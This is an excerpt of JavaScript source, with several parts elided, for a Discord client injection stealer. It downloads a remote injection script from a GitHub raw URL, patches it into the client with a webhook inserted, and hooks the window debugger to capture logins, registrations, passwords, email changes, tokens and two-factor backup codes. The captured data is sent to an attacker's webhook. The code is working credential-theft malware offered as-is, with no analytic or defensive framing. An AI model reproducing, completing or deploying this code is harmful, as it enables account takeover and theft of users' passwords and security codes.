...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/praiseware/inj/refs/heads/main/inj.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const executeJS = script => {
    ...
    const w = wins && wins[0];
    if (!w || !w.webContents) return Promise.resolve(null);
...
const hooker = async (content, token, account) => {
    ...
    if (!CONFIG.webhook || CONFIG.webhook === "%WEBHOOK%") return;
    try {
...
const fetch = async (endpoint, headers) => {
    const body = await request("GET", CONFIG.API + endpoint, headers);
    try {
...
const getServers = async token => {
    let guilds;
    try {
        guilds = await fetchServers(token);
    } catch (_) {
...
const BackupCodesViewed = async (codes, token) => {
    ...
    for (let code of filteredCodes) {
        ...
        if (c && typeof c === 'string') message += `${c.slice(0, 4)}-${c.slice(4)}\n`;
    }
    const content = {
...
async function initiation() {
    ...
    if (fs.existsSync(initiationPath)) {
        try {
            if (typeof fs.rmSync === 'function') fs.rmSync(initiationPath, { recursive: true });
            else fs.rmdirSync(initiationPath);
        } catch (_) {}
  ...
  const injectionUrl = '${CONFIG.injection_url.replace(/'/g, "\\'")}';
  const webhook = '${CONFIG.webhook.replace(/'/g, "\\'")}';
  let chunks = [];
  function init() {
      https.get(injectionUrl, (res) => {
          res.on('data', (c) => chunks.push(c));
          res.on('end', () => {
              let body = Buffer.concat(chunks).toString('utf8').replace(/%WEBHOOK%/g, webhook);
  ...
  try {
      ...
      if (data.length < 20000 || data === "module.exports = require('./core.asar')") init();
  } catch (e) { init(); }
...
const createWindow = () => {
    ...
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        ...
        try {
            ...
            if (!responseUnparsedData.body) return;
            responseData = JSON.parse(responseUnparsedData.body);
            ...
            if (!requestUnparsedData || requestUnparsedData.postData === undefined) return;
        ...
        switch (true) {
            ...
            case params.response.url.endsWith('/users/@me'):
                if (!requestData || !requestData.password) return;

                const token = await getToken();
                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, token, "changed his email to **" + requestData.email + "**");
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, token);
                }
                break;
        }
    });
